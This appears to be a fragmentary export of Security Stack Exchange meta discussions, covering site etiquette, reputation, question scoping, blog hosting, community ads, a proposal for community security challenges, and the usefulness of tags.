<li>What do/can you look for, security-wise, when you use a web application that's developed and run by a small vendor (i.e. not an application which you develop yourself in-house, nor an application developed by a large vendor)?</li>

<ul>
<li>Do not roll back the roll back. That is just starting an edit war and will lead you nowhere.</li>
<li>You can leave a comment (as I did) and try to explain. If you do, do it as politely as possible. Someone else using a bad tone is not an excuse for you to do the same. If you do not feel that you have the energy to be polite and clearly exaplain the issue, then do not leave a comment at all.</li>
<li>You can absolutely flag for moderator attention. A lot of situations are borderline if they warrant action or not. In those I usually flag, and let the moderators draw the border. You can look at your flag history and see if your flag was rejected. Unless you have lots of rejected flags I would not worrie about disturbing moderators with unnececary flags.</li>

<p>Personally I would not both comment and flag as that just adds to many voices. Instead I would pick one based on how severe I think the case is.

<p>But then you start asking things that are completely subjective.  No one can really tell what a customer will ask you, for the simple reason that the customer may have a wide range of awareness of information security issues.  Moreover, asking for a recommendation (of something to read) that will make you an expert is off-topic on the site.</p>

<p>Finally the checklist approach you cite is actually your nemesis, which explains why you believe in asking the question that way.  One of the biggest reasons there are so many security flaws in software/hardware is the checklist approach.  You need to change that approach into understanding to be able to perform well against all the issues you enumerate.</p>

<p>Understanding does not mean being an information security expert.  No one (well, probably almost no-one) can be an expert in all aspects of InfoSec, going from cold boot attacks, to watermarking encryption, to XSS, to ALSR workarounds.  You only need the understanding of the issue you face, and then of how computers work around that.  You already did part of it by analyzing that Azure managed hosting will provide you with SaaS instead of plain IaaS, and that way you have a couple of issues less to worry.</p>

<p>(The security of Azure cloud may not be perfect, none is, but it is likely to be better than what can be done single-handedly in a limited timeframe.)</p>

<hr>

<p>Objectively, modify your question to ask about the issues through which the data can be accessed in a networked application (I assume it is a networked application):</p>

<ul>
<li><a href=""https://www.owasp.org/index.php/Top_10_2013-Top_10"" rel=""nofollow noreferrer"">OWASP top 10 has several network vulnerabilities</a></li>
<li><a href=""https://security.stackexchange.com/questions/43639/why-is-the-access-control-allow-origin-header-necessary"">will you use CORS?</a></li>
<li><a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"" rel=""nofollow noreferrer"">XSS is always there, and very dangerous</a></li>
<li><a href=""https://security.stackexchange.com/questions/41988/how-does-sslstrip-work"">You say HTTPS, but what about HSTS?</a></li>
</ul>

<p>And last but not least <a href=""https://security.stackexchange.com/questions/12521/protection-of-keys-passwords-on-virtual-hardware-xen-kvm-vmware-etc"">your hosting provider always has full access to the data</a>.</p>

<p>Next you will need to find the weakest link of all of those (maybe discounting the hosting provider since that is their liability really), and ask the question on whether that is really the weakest link.  And, moreover, what would be the best mitigation.</p>

<p>When you can build the question you will not have to worry about questions a customer may make (unless they're particularly clueless) and not rely on checklists.  Your question will be able to fit into the <em>""satisfy my conscience""</em> part, you cite, in leaving someone's sensitive data private.</p>

<p><strong>Extra note</strong>: Given that you plan to be a small software vendor of products that may be run by government agencies, and that process sensitive data, you <strong>do</strong> need a lot of information security awareness.  Making a mistake in that area has huge repercussions (and often also liability).  A checklist approach to that is <strong>extremely</strong> dangerous in that situation, and I would highly advise against it.</p>

<p>My vote is no. The last post was 8 months ago, and the few blogs I follow are already well-established in the infosec community. I don't really look at Security.SE as a place to get cutting edge information. The community was inundated with dirty cow questions. Something like that would have been useful IMNSHO in a blog post. However, this community has a wiki that can be added to as well, and for the use cases that I see of a wiki and a blog in Security.SE, it seems to be duplicate effort.</p>

2536,2,2016-11-03T01:45:23.253,2,,"<p>In a nutshell rep is a different pool for each network site. So say if I was on this network site with a 3k rep and then joined the autos SE site. There is no way to genuinely know I am knowledgeable in that area without proving it. Hence, having to rebuild rep for that particular area. However once you gain 200 rep on a single network you are automatically given a bonus 100 rep for new networks you join. This way you can forgo a lot of the new user restrictions.</p>

2537,2,2016-11-03T01:47:52.550,4,,"<p>Roughly speaking, reputation is a measure of how knowledgeable you are in an area. Basically, users with higher rep are supposed to know what they're talking about more (but in practice it doesn't always work that way...)</p>

<p>According to your <a href=""https://security.stackexchange.com/users/129040/staycator"">profile page</a> you have:</p>

<ul>
<li>1 rep on Security</li>
<li>1 rep on Code Review</li>
<li>11 rep on Cross Validated</li>
</ul>

<p>so I'm not sure where you saw that you had 200 rep. Are you sure you didn't hit ""sign up"" instead of ""sign in"" and create a second account? I've seen people make that mistake before.</p>

<p>In the Stack Exchange network (including Stack Overflow) there are 3 types of posts:</p>

<ul>
<li>Questions</li>
<li>Answers to someone else's question.</li>
<li>Comments on someone else's question or answer.</li>
</ul>

<p>You gain reputation when people upvote your questions or answers (comments can be upvoted, but are not worth rep). You have <a href=""https://security.stackexchange.com/questions/141157/is-it-dangerous-to-use-default-router-admin-passwords-if-only-trusted-users-are/141608#141608"">one answer</a> on Security, but it has no upvotes, hence why you are still at 1 rep.</p>

<p>The rules to prevent brand-new accounts from posting comments is to reduce spam and lower the amount of work for the moderators. It's kinda sucky but unfortunately I think it's necessary.</p>

<p>Welcome to the site, I hope you get a feel for it. If you are brave enough to start throwing answers on stuff, you should be over 200 rep in a week or two (don't be discouraged if you get downvotes at first, the rules for a Q&amp;A site are a little stricter than reddit or a message board, so it takes some getting used to).</p>

Obviously, mentioning specific users by (user)name is risky. I for one would advise against that, unless they explicitly allow it themselves. Fortunately, you seem well aware of this type of netiquette.</p>

<ul>
<li>""Can somebody hack my phone?"" is going to get downvoted and closed, because it is a very general question that has a million variables - what model phone, what type of attack, what defenses are in place, and so on.  </li>
<li>""Can somebody use bug CVE-.... to gain root privileges on Android (version nr)"" is a lot better, if you can show <em>why</em> you believe this particular attack would work against this particular target.<br>

  <p>I apologize if posting an answer to my own question is not preferred on Meta, but I couldn't have fit everything into a comment. TL;DR, check the block quote at the bottom of this post for the proposed question.</p>
</blockquote>

<p>This is what I have come up with, and what I think the question should involve. Any and all input is appreciated. </p>

<p>The question should cover ""Who can see my data over a network?"" in a very general way, but will still need to address some specific concerns, these being:</p>

<ol>
<li>Is the ""attacker"" actively or passively listening in?</li>
<li>What measures are in place already? Is there a proxy?</li>
<li>What is the level of authority the ""attacker"" has on the network? </li>
<li>What sort of device is being used? What version?</li>
<li>What applications are being used?</li>
</ol>

<p>Now, these questions are, generally, the reason why there are so many different variations of the ""Who can see my data?"" question on the network right now. In order to sharpen the question while still making it as general as possible, I believe the question should address these questions in the following way: </p>

<ol>
<li>The attacker should be actively looking for any information they can find</li>
<li>The measures already in place should be of an unknown quantity, but we should assume there is no proxy, or the answer is pretty simple, but it should address what would happen if there was a proxy</li>
<li>The attacker's level of authority should be that of a Sys Admin, someone with administrator privileges on the network but no sort of ""illicit"" access, i.e. they can't install a dedicated piece of malware on the target's machine or access their device without permission (if they brought in their own device, for example) </li>
<li>As far as the device is concerned, any up-to-date device should be fair game for this question as we want it to cover a vast majority of the already existing questions</li>
<li>The applications being used should fall into the category of either encrypted or not encrypted, finer granulation would make the question to broad</li>
</ol>

<p>Now, how should the question be formulated? <strong>Here's my first swing</strong>:</p>

<blockquote>
  <p>Who can see my data when I am connected to an actively administered/monitored network, and what can they see? </p>
  
  <p>Assuming that:</p>
  
  <p>No one has had any illicit or physical access to my devices. My OSs' are all
  up to date. Some of my applications encrypt data, and others do not. There is a proxy, but I have not installed any certificates. There is very little other information about the network. </p>

  <p>Does it matter if I use my own computer or one provided for me by my employer? Does it matter what programs I use, or what websites I visit?</p>

<h3>Git</h3>

<p>I'll take Andre Borie's point about github pages and extend it here.</p>

<p>Two things about Wordpress worry me:</p>

<ol>
<li><p>We will likely need to create a new set of users and then link them to sec.SE in some way.  So we will know who a person on the blog is on sec.SE.</p></li>
<li><p>Wordpress is famous for screwing up page revisions, and searching who exactly performed an edit is painful.</p></li>
</ol>

<p>Both of these things can be solved by using a github repository.  We already have an official field where we can add the link between SE and gihub (OK, it is on the SO profile but that is still SE), therefore we have the link between accounts.</p>

<p>The revision control of a git repo will allow us to know exactly when something was edited and by whom.  Moreover, we can allow specific people (the editors) to be in charge of approving pull requests.</p>

<p>This isn't to say that the presentation of the blog cannot be on Wordpress, it only means that Wordpress should <strong>not</strong> be responsible for authenticating the contributors or keeping the post history.  Instead, the bulk of work is managed in the git repository.</p>

2583,1,2016-12-15T09:21:25.227,7,77,"<p>In March of this year, Canonical and Microsoft announced that the then-next update to Windows 10 (the one we now know as the ""Anniversary Edition"" that dropped in July) would contain <a href=""https://insights.ubuntu.com/2016/03/30/ubuntu-on-windows-the-ubuntu-userspace-for-windows-developers/"" rel=""nofollow noreferrer"">Ubuntu on Windows</a>, a sort of-emulation mode that would allow Bash and a selection of tools and programs that run on Ubuntu to run on Windows. At that time, I asked <a href=""https://security.stackexchange.com/questions/119075/with-ubuntu-on-windows-10-could-exploits-and-malware-that-work-on-ubuntu-or-re"">a question</a> about whether that could have any implications of cross-platform effectiveness of malware, exploits, etc. between Windows and Linux. However, the question was quickly closed, on the grounds that it was primarily just calling for speculation and opinion. As best as I can tell from the comments the question got, the closing voters thought that since the feature had been announced but hadn't made it into a final, shipping version of Windows yet (it was sort of at the beginning of being released to Microsoft's Insider beta channels at that point) any questions about it would just inherently be in the realm of speculation. And that was that.</p>

<p>Except that, of course, time didn't stand still. In July, MS did indeed partner with Cannonical to release a shipping, for-public-distribution version of Ubuntu on Windows on Windows 10.  But more than that, a few months later at DerbyCon a security researcher actually <a href=""https://www.youtube.com/watch?v=9aPJpB28foA&amp;list=PLn8ut0t_rVT933cZ0uyM7qfQdN7gNO-7X&amp;index=46"" rel=""nofollow noreferrer"">gave a talk</a> about his technical research on the security aspects and implications of the move. (Quick summary: It's complicated.) So, not only is there definitely a live question at this point, there seem to be at least some of the makings of an answer out there.  </p>

<p>So I'm wondering: what's the best practice in a situation where a question that was closed* as speculative/opinion based has since clearly become not-speculative due to developing events? Re-ask the question? Petition to have the existing question re-opened? Something else?</p>

<p>*At the time, I voiced my disagreement with the closing voters' reasoning and decision. And I haven't necessarily changed my view. But... water under the bridge; for present purposes, I'm happy to assume the speculative-to-non-speculative view of events is correct.    </p>

2589,2,2016-12-19T23:46:24.167,11,,"<p>I'd suggest we need both as all phones are not necessarily smartphones. In fact all the disaster folks I work with use non-smartphones (such as the Nokia 6210i) specifically as they do not require the same sort of infrastructure as smartphones, so will still work in major disasters. Also, their battery life is weeks rather than days.</p>

<p>The security implications for each are different as well. A smartphone typically has a full tcp/ip stack, and a fully functional OS. 'Dumb' phones are very limited in functionality, so can be much more secure, and are certainly not susceptible to the same kind of attacks.</p>

<p>The phone tag is about the traditional telephone network. It is for issues with dumb phones or the aspects of your smart phone that makes it just that - a phone.</p>

<p>On the other hand, the smartphone and mobile tags are about the aspects of your phone that makes them tiny mobile computers. The distinction between the two seems to be that mobile includes tablets while smartphone doesn't. There is no specific tag for tablets. In my opinion these two tags could be merged.</p>

<p>I don't see the point with a cellular tag on top of the others. Since it has only three questions I think we could just kill it.</p>

2599,2,2016-12-28T22:31:11.383,9,,"<p>I have the impression that we are planning too much and doing too little practical work over the blog revamp.  We are still discussing ideas whilst no practical, viable, blog infrastructure is coming out of it.  I'll first enumerate what I believe as being the issues we are facing:</p>

<ol>
<li>Resistance to a wordpress solution, this is given the fact that wordpress has a horrible record of security problems.</li>
<li>Variety of possible engines to use: jekyll, ghost, or wordpress itself.  Possibly others (if it was me to do admin I'd love Django :) )</li>
<li>Hosting.  One thing is to choose an engine, another is to be able to host the resulting blog.  Hosting cost money after all.  A <em>wordpress.com</em> (the hosting service, not the engine) or a github pages jekyll would be a solution to that but again we are discussing both the engine and hosting at the same time.</li>
</ol>

<p>My take on figuring both things at the same time is to <strong>make a wordpress export from the current blog, place it in some file locker and add to this meta question</strong>.  Then, anyone of the people willing to help in the creation of the blog, can simply build a prototype.  We would be able to make the prototype in whichever way we want: hosting service, github pages, even write a blog app from scratch (although I would not recommend the later).</p>

<p>If we have several prototypes to choose from it will provide with a better discussion than the uncertainty that we have now.  Even if some part of a prototype would not be perfect we would still have a blog, and be able to improve it if needed.  Note that several prototypes will fail, that's a good thing, since we will be eliminating risk from bad decisions from the start.</p>

I am starting my career in IS - and though many of you may have been here for a long time, I want to remind you these are all individuals who probably don't have mentors or know people who have been in IS.  I, personally, have no mentor - and these people are probably 20-somethings who are looking for validation of going into this field and trying to get a re-assuring push.  </p>

<p>That said, understanding aside - these requests or posts don't make good questions.  The path is one an individual must take - no one here can tell me why I should look at moving into compliance more than AppSec, etc.  There are far too many answers to give.</p>

<p>A good question for [career] would usually turn into a different question - for instance, I might ask: ""I am learning Pen Test Scripts in the Windows environment - should I spend my time in Python, or PowerShell, or something else?""

<p>Even questions regarding certification guidance usually aren't that great - ""Do I get the Security+ first or SSCP?"" are already answer - and can be found with easy google searches - I know because I had the same questions.  </p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>useful or cool security related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>The question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag. In addition to enabling the functionality of the advertisements, this tag also pre-fills the answer form with the above required form.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be 300 x 250 pixels, or double that if high DPI.</li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of 150 KB</li>
<li>If the background of the image is white or partially white, there must be a 1px border (2px if high DPI) surrounding it.</li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently <strong>6</strong>) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/2630"">here</a>.</p>

2639,1,2017-02-03T03:00:06.553,14,315,"<p>I recently suggested in chat that we could organize recurring security challenges, similar to <a href=""https://reverseengineering.meta.stackexchange.com/questions/219/should-we-have-reverse-engineering-competitions-to-increase-site-participation"">this proposal</a> on RE.SE (thanks, @SYS_V). The idea is to periodically publish a security problem / puzzle that has to be solved by the community. That's fun, educational and gives users an extra reason to regularly return to the site. What are your thoughts on this?</p>

<ul>
<li><p>First of all, do we want this and would this format work well within the SecSE community?</p></li>
<li><p>What would be an appropriate cycle? Weekly/monthly/...?</p></li>
<li><p>Who creates the challenges? (E.g., we could let users with their own challenge ideas specify in which week they want to submit it, on a first-come first-served basis.)</p></li>
<li><p>How would the challenges be posted? As regular questions / purely on meta?</p></li>
<li><p>What do we expect from a good challenge?</p></li>
</ul>

<p>Possible challenge subjects could be to identify a vulnerability in a given code snippet, recover an encrypted message, reverse-engineer an unknown protocol, filter evasion, etc. In my opinion, a good challenge comes with a concise, not too far-fetched scenario and doesn't rely on external resources (like a target server that has to be maintained). A challenge wouldn't always have to be particularly difficult but should carry a lesson - like highlighting an often overlooked type of vulnerability or teaching an important security principle.</p>

2645,2,2017-02-16T23:05:18.367,1,,"<h3>What about unofficial, irregular, community-developed security challenges?</h3>

<p>I do not believe that Arminius was implying or suggesting that SE developers be tasked with implementing SecSE security challenge events. They likely lack the field-specific expertise required to create appropriate and worthy challenges anyway. However, some of the users of this site do possess the knowledge and the ability to create such challenges.</p>

<p>There is a way to take advantage of the decentralized, democratic format of SE sites in general as well as the relative popularity and level of activity of SecSE in order to create the equivalent of challenge events:</p>

<ul>
<li>anyone can ask a question</li>
<li>anyone can answer a question</li>
<li>at 75 reputation one can place bounties on questions</li>
<li>at 300 reputation one can create new tags</li>
</ul>

<p>Here is what I am proposing: any user with at least 300 reputation can at any time create a security challenge, present it as a question, tag the question with something like ""Security Challenge"" plus the tags specifying the subject matter of the challenge (e.g. ""buffer-overflow"") and then place a bounty on it to attract attention. In other words, unofficial security challenges could be developed and posted at any time, all the while remaining within the current framework of what is allowed by the SE site format. All the tools already exist.</p>

<p><strong>An Example</strong></p>

<p>Allow me to give a hypothetical example of what this would look like. Let's say that there is a user with ~10,000 reputation. Let's call this user ""Infosec_Pro"". User Infosec_Pro writes exploits like Dr. Seuss wrote children's books and is a bit bored. He also thinks it would be amusing to watch hapless wannabe hackxors struggle solving an entry-level shellcoding  challenge. He decides to craft a simple vulnerable C program, posts the source code and a description of the challenge in a question titled ""<strong>Security Challenge</strong>: Exploit this vulnerable C program"", tags it with ""<strong>Security Challenge</strong>"", ""<strong>Entry Level</strong>"",""buffer-overflow"",  ""exploit"" and whatever else is appropriate, and places a bounty of 50 on the question since it is entry-level difficulty. Infosec_Pro then sits back and watches as his question (challenge) shows up in ""Featured"" and garners a bit of attention.</p>

<p>Now another hypothetical user, ""XX H4ck1ng L0rd XX"", who thinks he is just the best because he is good at guessing his grandma's passwords, sees the bounty and says to himself ""Yes! I have a chance to increase my rep from 100 to 150!"" and is thus motivated to learn about BoF etc.</p>

<p>People who support the idea of having security challenges can upvote the challenge (question) so that Infosec_Pro gets his 50 rep back and attract more attention to the challenge, and people who publicly claim to support security challenges but prefer to just sit around and pooh-pooh other people's ideas ignore it. </p>

<p>Eventually, a few write-ups are posted as anwers and Infosec_Pro, having much enjoyed himself watching the struggles of others, chooses the write-up (anwer) that pleases him the most. The scrub who wins the challenge (has his answer accepted) not only gets rep from the bounty but also from whatever upvotes his write-up received.</p>

<p><strong>Features</strong></p>

<ul>
<li>bounty amounts reflect difficulty level. Bounties of 50 indicate entry-level challenges at one extreme and bounties of 500 are awarded for real brain-burners at the other extreme.</li>
<li>Tags are used to distinguish challenges from conventional questions</li>
<li>Tags describe challenge difficulty level</li>
<li>""Security Challenge"" is in the question title to make it blindingly obvious</li>
</ul>

<p><strong>Pros and Cons</strong></p>

<p>Pros:</p>

<ul>
<li>Total flexibility. Anyone can create any kind of challenge at any time. There could be crypto challenges, bof challenges, Windows challenges, Linux challenges, web app challenges etc. In other words, something like this could begin this moment while you are reading this line. Yes. Right now. Immediately.</li>
<li>Unilateral action is possible. Even if every person who read this said to themselves ""My word! Whoever proposed this is an utter dunce!"", any individual user could exercise their free will to create and post a challenge question if they so chose (given that they abide by the rules defined in the help center). </li>
<li>Tangible rewards for both the challenge developer and the challenge solver. The challenge developed receives upvotes based on the quality and popularity of the challenge, and the solver gets upvotes base on the quality of their write-up/answer</li>
</ul>

<p>Cons:</p>

<ul>
<li>There is no way to prevent someone with high rep from solving entry level challenges and ruining it for everyone</li>

2646,1,2017-02-21T21:28:00.563,-1,62,"<p>There are many posts about the importance of cleaning up questions, and the need for that is clear.  But why would a question be marked as too broad when there is only one answer and it is a good one?  It is not as if there is a disk space, server speed, or SEO concern.  Wouldn't it be more respectful to the person who took the time to prepare an answer to mark the question for editing rather than closure?</p>

<p><strong>Impact On Answer Author Morale</strong></p>

<p>This trend of hyper-hold-and-delete is very annoying to those of us who like to provide assistance to askers.  One might work an hour on a good answer (that intelligently responds to ALL of the principles and rules of the community) only to find the answer is on hold and will probably be closed.</p>

<p>Even if we see the points (broadness, begging opinions, inadequate prior investigation) and suggest a question answer, our time and effort is discarded FAR too often.  Future readers cannot benefit from what we've written, and the interest in answering well is diminished.</p>

<p><strong>Incentivization</strong></p>

<p>StackExchange is a system of incentives.  Is it the SE marketing objective to discourage thought and excellence in preparing answers?  Of course not.</p>

<p>The question is whether there should be a TOO BROAD hold when there is exactly one answer and it received up votes.  Perhaps there should be another mechanism.</p>

<p><strong>Suggested Solution</strong></p>

<p>Can the rep increment for a good edit of a broad question be raised?</p>

<p>Another way to ask, ""What makes a good career question?"" is to ask, ""What characteristics might a career related question have or what criteria must it meet to not get closed?""</p>

<p>I don't hold with the popular view that reading the rules will minimize the risk of question closure.  It certainly helps, but I don't think it is always on pure and objective criteria that closures occur.  Whether something is opinion-based is often an opinion.  Q&amp;A communities attempt to arrive at something close to an objective truth through an incentivized democratic process.</p>

<p>A good preparatory question to ask is apolitical and mathematical: ""What to the 40% x 82 career questions have in common that do not trigger the impulse to mark them as begging opinion or broadness?""</p>

<p>It would be an interesting study and could be directed at any of the tags.

As far as I can tell, the question was about a common confusion about integer overflow in C and C++ which can be a vector of attack. The only thing I can think of is that it might be too programming-specific. But then again, it is a conceptual question and not asking for advice in writing or debugging code. I've seen plenty of questions regarding PHP or Java Script code. Are the rules for C different? There even is a C and C++ tag (which were applied to the question in question) so I assume those technologies are not off-topic per se.</p>

<a href=""https://security.stackexchange.com/questions/40304/how-to-secure-an-open-wifi-access-point/40306#40306"">How to secure an open wifi access point</a></p>

<p>I do understand that an insecure public hotspot is exactly that, insecure (at least from the user perspective).</p>

<p>However given the limits of physical access and a reasonable amount of additional configuration/security measures one could argue that it should be possible to make the Wifi AP itself (the OS) secure from whatever their users do.</p>

<p>My question would focus on that part as I am tasked to evaluate exactly that.</p>

<p>Following would be my draft. I currently see it as quite 100% sure to be closed, making the answer still missing in my opinion.</p>

<blockquote>
  <p><strong>Setup:</strong></p>
  
  <p>Debian Linux on a small embedded computer connected to the internet via GSM Modem.</p>
  
  <p>To debug, monitor, maintain and update the device it is connected via VPN to a server.</p>
  
  <p>The device is currently able to act as a router for our other devices (via wifi or ethernet).</p>
  
  <p>We now want to extend that router functionality to implement an open Wifi AP instead of the current closed one.</p>
  
  <p><strong>Problem:</strong></p>
  
  <p>I need to figure out if there is a way to reasonable secure the Wifi AP itself to prevent malicous user from accessing anything on the Wifi AP itself, especially our VPN connection.</p>
  
  <p>For now I am thinking of at least limiting access via iptables, blocking every access to the VPN IPs, basically limiting the wifi clients to access anything else, but I was unable to find additional security steps I should take.</p>
  
  <p>What other steps would one have to take?</p>

<p>To ask, ""why is X insecure?"" requires that there be some understanding that X is insecure. So, first, there needs to be some common ground on that point. To ask ""someone said X is insecure, why is X insecure?"" is a non-starter. There can be no common ground with a non-exisitent 3rd party. As I mentioned in my comments, we cannot tell you why someone else thinks something. </p>

<p>By asking for context and details, the hope is that we can discover why, perhaps, <em>we</em> might conclude X is insecure, given certain conditions. That's why I, and others, asked for context and details.</p>

<p>Your misconception is not about SSH, but about how this site works. We are a Q&amp;A site with the hopes that other people might discover someone else who has asked the same question they currently have. That means the questions need to have some level of universality and generality to have a hope to be a question someone else might ask with applicable answers. Hence, editing to provide guidance to those answering (to get you some kind of answer) and to provide a level of universality.</p>

<hr>

<p>Every so often, a new user asks a question that is more programming-related than security related. Then some of our users will comment that the question belongs on Stack Overflow. Such comments get upvotes, too.</p>

<p>The problem is that most of these questions are not a good fit for Stack Overflow at all. These questions tend to lack basic information about infrastructure, logs, an <a href=""https://stackoverflow.com/help/mcve"">MCVE</a>, or even a minimal show of research.  </p>

<p>Encouraging new users to re-post such questions on Stack Overflow, is doing them a great disservice. First their question wasn't welcome on Security.SE. Then they are referred to Stack Overflow, where their question gets downvoted, closed and deleted. Nobody's happy in this scenario.</p>

<p>So the question is - how can we make our community more aware that re-posting or migration is only good for questions that already meet minimal quality requirements?  </p>

<p>Maybe we could create a pro-forma comment, that explains to a new user what their question should include, before posting it on Stack Overflow?</p>

<p>In the long run, I think the only solution is to comment whenever someone suggests a bad migration (be it in a comment or through a close vote). I see no need for a stock comment - instead I think it is better to tailor one to the situation, explaining why the specific question is not on topic on SO.</p>

<p>When commenting, I feel no need to explain what improvements needs to be done for it to work on SO. Instead, I just explain why it is off topic there. The good people on SO have a hard time making people understand their quality standards - I don't think we would have any better luck. So I just warn them that the question will be closed there, to spare them the unpleassant surprise.</p>

<p>As a high-rep user, I spend a fair amount of time editing tags on questions, and I've recently started working towards the <a href=""https://security.stackexchange.com/help/badges/87/research-assistant"">Research Assistant</a> badge by improving tag wikis, <strong>but why? Do people actually use tags for some useful purpose?</strong></p>

<hr>

<p>I'm being tongue-in-cheek and inflamatory because I'm hoping someone will get offended enough to write a really solid reason why tags are worth all the time and effort of maintaining them.</p>

<p>I know tags are useful for specifying the context of the question (arguably, questions should already do this in the body, but tags are good for orienting the reader before they dive into the text).</p>

<p>Tags are also useful as search queries when you're looking for something specific, and for sending weekly digest emails, but are they really <em>that much</em> more useful than just searching for the keyword?</p>

<p>Now, on other SE sites, I find tags immensely useful. Like only wanting to see [java] questions on SO, or only wanting to see [overwatch] questions on Gaming, but do tags get used in the same way here? Maybe I use this site differently than most people in that I'm kinda here to learn anything and everything...</p>

<p>Tags makes questions searchable. The word <a href=""https://security.stackexchange.com/questions/tagged/time"" class=""post-tag"" title=""show questions tagged &#39;time&#39;"" rel=""tag"">time</a> might show up in a lot of questions, but very few of them actually deals with the concept of time as it is defined in the tag excerpt (by you, in an excellent, recent edit). Explicitly labeling those questions makes them easy to find.</p>

<p>There will soon be 40k questions. The value of a curated collection of questions and answers is zero if you cant find the questions you want. I'm sure you all heard the one about the internet being like the worlds biggest library, but with a drunk librarian. Well, here on Stack Exchange I think the librarian should stay sober.</p>

2704,2,2017-04-11T04:03:25.280,4,,"<p>Tags can absolutely be useful. I just think a lot of them aren't currently used in sensible ways.</p>

<p>Many of the <a href=""https://security.stackexchange.com/tags?tab=popular"">most popular tags</a> seem to be fundamentally misunderstood:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/tagged/appsec"" class=""post-tag"" title=""show questions tagged &#39;appsec&#39;"" rel=""tag"">appsec</a>: There is no common pattern among the questions in that category at all.</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/web-browser"" class=""post-tag"" title=""show questions tagged &#39;web-browser&#39;"" rel=""tag"">web-browser</a>: Useful for web browser security, but actually applied to arbitrary web application questions (XSS, SQLi, etc.).</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/http"" class=""post-tag"" title=""show questions tagged &#39;http&#39;"" rel=""tag"">http</a>: Should be about questions related to the protocol, but again used for XSS questions, etc.</li>
<li><a href=""https://security.stackexchange.com/questions/tagged/penetration-test"" class=""post-tag"" title=""show questions tagged &#39;penetration-test&#39;"" rel=""tag"">penetration-test</a>: Useful for general penetration testing patters, but actually applied to anything that occurred to the asker during a pentest.</li>
</ul>

<p>The list goes on.</p>

<p>Also there are the generic <a href=""https://security.stackexchange.com/questions/tagged/attacks"" class=""post-tag"" title=""show questions tagged &#39;attacks&#39;"" rel=""tag"">attacks</a>, <a href=""https://security.stackexchange.com/questions/tagged/defense"" class=""post-tag"" title=""show questions tagged &#39;defense&#39;"" rel=""tag"">defense</a>, <a href=""https://security.stackexchange.com/questions/tagged/exploit"" class=""post-tag"" title=""show questions tagged &#39;exploit&#39;"" rel=""tag"">exploit</a>, <a href=""https://security.stackexchange.com/questions/tagged/vulnerability"" class=""post-tag"" title=""show questions tagged &#39;vulnerability&#39;"" rel=""tag"">vulnerability</a> tags that are all really popular but I find it hard to see how they help anyone find what they are looking for.</p>

<p>To me it seems that in order to create a meaningful library-like tag structure it would require a pretty aggressive clean-up and I'm not sure if improving the tag wikis alone will fix that. On the other hand, using the favorite tag feature to filter out interesting questions works just fine.</p>

2705,2,2017-04-11T06:56:35.873,6,,"<p>Tags serve <strong>no</strong> purpose. Neither does the Dewey Decimal Classification system or the Library of Congress Classification system serve any purpose in libraries. For that matter, directories in hard drive file systems are just a waste of space on the drive. After all, every question has a title, just like every book does, and every file has a name. I can search for the title I want when looking for a question, and I can see from the title what it's about without needing to look at the tags.</p>

<hr>

<p>Having said that, as a tongue-in-cheek reply to your tongue-in-cheek question, lets look at a few of the purposes truly served, and how it falls apart.</p>

<ul>
<li><em>Notices</em>: I can subscribe to an RSS feed for a tag such as <a href=""https://security.stackexchange.com/questions/tagged/apache"" class=""post-tag"" title=""show questions tagged &#39;apache&#39;"" rel=""tag"">apache</a> and get notified of question activity for that tag. If I'm an expert in that area and wish to share my knowledge with others, this will let me know when others have questions that might benefit from that knowledge.

<ul>
<li>This presupposes that the tag is applied to questions where it should be, and only where it should be. I will miss questions that might qualify if the tag isn't applied to the question.</li>
<li>Suffers from ""false positives"" when a question has a tag it doesn't deserve, or need, as noted with examples in the answer from @Arminius. This puts questions in the feed that don't belong there, and require you to filter them out yourself.</li>
</ul></li>
<li><em>Filters</em>: 

<ul>
<li>As pointed out by @schroeder in his answer, I can highlight or dim questions in the listings based on my preferences using tags. Again this helps find what I have an interest in, and ignore what I have no interest in, and keeps everything else ""open for investigation"" in the list. (I'd rather it eliminated, rather than dimmed, the ignored tags.)</li>
<li>It is also possible to list questions that only have a tag applied to them, ignoring all others. Handy if I have a question about something, but don't know how to ask it.

<ul>
<li>Both of these suffer from tags not being applied when they should have been like <em>Notices</em> above. Unless they have one of the ignored tags, however, I will still see them, just not highlighted.</li>
<li>Again, both of these are affected by false positives.</li>
